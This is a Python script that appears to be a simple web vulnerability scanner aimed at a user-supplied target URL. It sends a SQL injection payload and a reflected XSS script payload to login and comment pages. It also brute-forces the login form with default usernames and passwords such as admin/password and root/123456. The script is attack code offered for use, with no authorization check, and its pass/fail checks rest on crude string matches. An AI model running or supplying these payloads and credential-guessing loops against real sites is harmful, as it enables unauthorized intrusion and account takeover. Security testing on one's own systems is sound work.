import requests
import time
from bs4 import BeautifulSoup

# Target URL
target = "https://trysoup.dev"  # Replace with your target URL

# SQL Injection Test
def sql_injection_test():
    payload = "' OR '1'='1"
    url = target + "/login.php?user=" + payload
    try:
        r = requests.get(url)
        if "admin" in r.text or "error" in r.text:
            print("✅ Vulnerable to SQL Injection!")
        else:
            print("❌ Not vulnerable to SQL Injection.")
    except Exception as e:
        print("Error in SQL Injection test:", e)

# XSS Test
def xss_test():
    payload = "<script>alert('XSS')</script>"
    url = target + "/comment.php?comment=" + payload
    try:
        r = requests.get(url)
        if payload in r.text:
            print("✅ Vulnerable to XSS!")
        else:
            print("❌ Not vulnerable to XSS.")
    except Exception as e:
        print("Error in XSS test:", e)

# Brute Force Login Test
def brute_force_test():
    usernames = ["admin", "user", "root", "test"]
    passwords = ["password", "123456", "admin", "123456789"]
    for user in usernames:
        for pwd in passwords:
            data = {"username": user, "password": pwd, "submit": "Login"}
            try:
                r = requests.post(target + "/login.php", data=data)
                if "Welcome" in r.text:
                    print(f"✅ Brute force success: {user}:{pwd}")
                    return
            except Exception as e:
                print("Error in brute force test:", e)
    print("❌ Brute force failed.")

# Main function
def main():
    print("Starting vulnerability scan on:", target)
    sql_injection_test()
    xss_test()
    brute_force_test()
    print("Scan complete.")

if __name__ == "__main__":
    main()